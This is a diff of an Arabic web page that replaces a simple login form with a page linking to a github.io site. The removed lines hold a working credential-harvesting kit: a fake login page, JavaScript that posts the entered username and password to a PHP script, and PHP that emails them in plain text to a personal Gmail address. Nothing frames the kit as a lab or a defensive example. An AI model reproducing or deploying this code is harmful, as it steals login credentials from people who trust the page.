@@ -1,54 +1,40 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+
+<html lang="ar" dir="rtl">
 <head>
-    <title>صفحة تسجيل الدخول</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>رابط GitHub</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .link-box {
+      background: #fff;
+      padding: 20px 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      font-size: 20px;
+      text-align: center;
+    }
+    a {
+      color: #0066cc;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
 <body>
-    <h1>تسجيل الدخول</h1>
-    <form id="login-form">
-        <label for="username">اسم المستخدم:</label>
-        <input type="text" id="username" name="username" required>
-        <br>
-        <label for="password">كلمة المرور:</label>
-        <input type="password" id="password" name="password" required>
-        <br>
-        <button type="submit">تسجيل الدخول</button>
-    </form>
-
-    <script src="script.js"></script>
+  <div class="link-box">
+    <a href="https://lucymemo.github.io/Amanish/" target="_blank">اضغط هنا للانتقال إلى صفحة GitHub</a>
+  </div>
 </body>
 </html>
-const form = document.getElementById('login-form');
-
-form.addEventListener('submit', (event) => {
-    event.preventDefault();
-
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    fetch('send_data.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ username, password })
-    })
-    .then(response => response.text())
-    .then(data => console.log(data));
-});
-<?php
-// استقبال البيانات من JavaScript
-$data = json_decode(file_get_contents('php://input'), true);
-$username = $data['username'];
-$password = $data['password'];
-
-// إعدادات البريد الإلكتروني (قم بتغييرها إلى إعداداتك)
-$to = 'lucifer1976m@gmail.com';
-$subject = 'بيانات تسجيل دخول جديدة';
-$message = "اسم المستخدم: $username\nكلمة المرور: $password";
-$headers = 'From: your_email@example.com';
-
-// إرسال البريد الإلكتروني
-mail($to, $subject, $message, $headers);
-
-echo 'تم إرسال البيانات بنجاح';
